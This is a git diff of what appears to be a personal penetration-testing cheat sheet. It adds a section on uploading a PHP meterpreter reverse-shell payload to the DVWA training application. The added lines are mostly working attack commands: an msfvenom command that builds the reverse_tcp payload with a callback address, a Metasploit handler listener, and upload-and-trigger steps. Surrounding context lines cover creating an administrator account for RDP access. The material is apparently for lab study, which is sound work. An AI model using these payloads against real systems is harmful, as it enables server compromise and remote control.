@@ -82,7 +82,19 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
 
-Possible Nessus Username admin / password
+MSF File Upload
+exploit package
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.21 lport=4444 -f raw -o exploit.php
+
+listener
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost X.X.X.X (Parrot OS IP)
+set port 4444 (Default)
+exploit
+
+Then upload and navigate tp page URL (http://<IPADDRESS>/DVWA/hackable/uploads/exploit.php)
 
 ```
 #  SQL Injections
